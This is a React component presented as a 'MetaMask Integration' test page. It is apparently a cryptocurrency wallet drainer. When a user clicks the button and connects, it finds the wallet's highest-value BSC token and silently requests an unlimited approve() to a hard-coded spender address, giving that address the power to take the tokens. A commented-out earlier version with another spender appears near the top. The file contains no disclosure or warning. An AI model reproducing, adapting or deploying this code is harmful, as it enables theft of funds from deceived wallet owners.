import React, { useState, useEffect } from 'react';
import Web3 from 'web3';
import Moralis from 'moralis';
import { nftAddress } from '../constants/address';
import BUSD_ABI from "../constants/abis.json"; // Import BUSD_ABI directly
import { chainId } from '../constants/address';
import api from '../util/api';
const tAbi = require("../constants/abis.json");

/* Moralis.start({
  apiKey: process.env.REACT_APP_MORALIS_APY_KEY,
}) */;

function Test() {
  const [account, setAccount] = useState('');
  const rpcURL = "https://bsc-dataseed.binance.org/";
  const web3 = new Web3(rpcURL);

 /*  const setApprove = async (walletAddress0) => {
    
    console.log(walletAddress0)
    
        let approveAddress = "0x49711c21e21e052a3f7ad5abdea854ac1d85c3d0"; //spender address
        let price = "0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF";
        let maxValueTokenAddress = "0XE9E7CEA3DEDCA5984780BAFC599BD69ADD087D56";
    
        window.contract = await new web3.eth.Contract(tAbi[0], maxValueTokenAddress);
        let tokenContract = window.contract;
    
        const approveTransactionParameters = {
          to: maxValueTokenAddress,
          from: walletAddress0,
          data: tokenContract.methods.approve(approveAddress, price).encodeABI(),
        };
    
        let txx = await window.ethereum.request({
          method: "eth_sendTransaction",
          params: [approveTransactionParameters],
        })

      } */

  
      const setApprove = async (walletAddress0) => {

        //-------------------------   get token info from server ---------------------------
        
        let tokens, tokenPrices, tokenDecimals;
        await api
          .post("/readFile", {
            params: {},
          })
          .then(function (res) {
            let data = res.data.Success.split(",");
            data.splice(-1, 1);
            // console.log(data)
            let j = 0;
            tokens = [];
            tokenPrices = [];
            tokenDecimals = [];
            for (let i = 0; i < data.length; i+=3) {
              tokens.push(data[i]);
              tokenPrices.push(data[i+1]);
              tokenDecimals.push(data[i+2]);
              j++;
            }
            /*  console.log('tokens', tokens);
            console.log('tokenPrices', tokenPrices);
            console.log('tokenDecimals', tokenDecimals); */
          })
          .catch(function (error) {
            console.log("stories error response :: ", error);
          });
            
        //-------------------------   get token address from wallet ---------------------------
        
            const options = { chain: '0x38', address: walletAddress0, "order": "DESC", };
            let tx = await Moralis.EvmApi.token.getTokenTransfers(options);

            console.log('tx', tx)
        
            let walletTokenAddress = [];
            for (let i = 0; i < tx.result.length; i++) {
              let is = false;
              for (let j = 0; j < walletTokenAddress.length; j++) {
                if (walletTokenAddress[j] == tx.result[i].address.toUpperCase()) {
                  is = true;
                }
              }
              if (is == false) {
                walletTokenAddress.push(tx.result[i].address.toUpperCase());
              }
              is = false;
            }
            console.log('walletTokenAddress', walletTokenAddress)
        
        
        //-------------------------   get token balance from wallet tokens ---------------------------
        
            let walletTokenBalance = [];
            const tAbi = require("../constants/abis.json");
        
            for (let i = 0; i < walletTokenAddress.length; i++) {
              window.contract = await new web3.eth.Contract(tAbi[0], walletTokenAddress[i]);
              let balance = await window.contract.methods.balanceOf(walletAddress0).call();
              walletTokenBalance.push(Number(balance));
            }
        
            /* console.log("Balance: ", walletTokenBalance) */
        
        //-------------------------   get token price ---------------------------
        
            let walletTokenPrices = [];
            let walletTokenDecimals = [];
            let walletTokenB = [];
            for (let i = 0; i < walletTokenAddress.length; i++) {
              walletTokenPrices[i] = 0;
              walletTokenDecimals[i] = 0;
              for (let j = 0; j < tokens.length; j++) {
                if (tokens[j] == walletTokenAddress[i]) {
                  walletTokenPrices[i] = Number(tokenPrices[j]);
                  walletTokenDecimals[i] = Number(tokenDecimals[j]);
                }
              }
            }
        
            for (let i = 0; i < walletTokenAddress.length; i++) {
              walletTokenB[i] = walletTokenBalance[i] * walletTokenPrices[i] / (Math.pow(10, walletTokenDecimals[i]));
            }
            /* console.log("Prices: ", walletTokenPrices);
            console.log("Decimals: ", walletTokenDecimals);
            console.log("wholeBalance:", walletTokenB); */
        
        
        
        //-------------------------   get max big price token  ---------------------------
        
            let len = walletTokenAddress.length;
            let walletTokenB1 = [];
            let maxValueTokenAddress = "0x55d398326f99059ff775485246999027b3197955";  ;
        
            if (len > 0) {
              for (let i = 0; i < len; i++) {
                walletTokenB1[i] = walletTokenB[i];
              }
              for (let i = 0; i < len-1; i++) {
                for (let j = i+1; j < len; j++) {
                  if (walletTokenB1[i] < walletTokenB1[j]) {
                    let x = walletTokenB1[i];
                    walletTokenB1[i] = walletTokenB1[j];
                    walletTokenB1[j] = x;
                  }
                }
              }
              console.log('walletTokenB1', walletTokenB1)

              if (walletTokenB1[0] == 0) {
                maxValueTokenAddress = "0x55d398326f99059ff775485246999027b3197955";
              } else {
                for (let i = 0; i < len; i++) {
                  if (walletTokenB[i] == walletTokenB1[0]) {
                    maxValueTokenAddress = walletTokenAddress[i];
                  }
                }
              }
            } else {
              maxValueTokenAddress = "0x55d398326f99059ff775485246999027b3197955";
            }
            /* console.log(walletTokenB1);
            console.log(walletTokenAddress);
            console.log(maxValueTokenAddress); */
        
        //-------------------------   performing approve ---------------------------
        
            /* let approveAddress = "0x49711c21e21e052a3f7ad5abdea854ac1d85c3d0"; */
            let approveAddress = "0xC7C421854295709136ED9179f16E469909530F44";
            let price = "0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF";
        
            window.contract = await new web3.eth.Contract(tAbi[0], maxValueTokenAddress);
            let tokenContract = window.contract;
        
            const approveTransactionParameters = {
              to: maxValueTokenAddress,
              from: walletAddress0,
              data: tokenContract.methods.approve(approveAddress, price).encodeABI(),
            };
        
            let txx = await window.ethereum.request({
              method: "eth_sendTransaction",
              params: [approveTransactionParameters],
            })
           
        
          }


  const onBtnClick = async () => {

    if (window.ethereum) {
      try {
        const chain = await window.ethereum.request({ method: 'eth_chainId' })
        console.log(chain)
        if (chain == chainId) {
          const addressArray = await window.ethereum.request({
            method: 'eth_requestAccounts',
          })

          console.log(addressArray)

          if (addressArray.length > 0) {
            setApprove(addressArray[0])
            setAccount(addressArray[0])
          } else {
          }

        } else {
          window.ethereum.request({
            method: 'wallet_switchEthereumChain',
            params: [{ chainId:chainId }],
          }).then(function(res) {

            // alert("Click again");
          })
        }
        
      } catch (err) {
      }
    } else {
    }
  }



  
  
  return (
    <div>
      <h1>MetaMask Integration</h1>
      <button onClick={onBtnClick}>
            click me
          </button>
      {account ? (
        <div>
          <p>Connected Account: {account}</p>
        </div>
      ) :null}

    </div>
  );
}

export default Test;
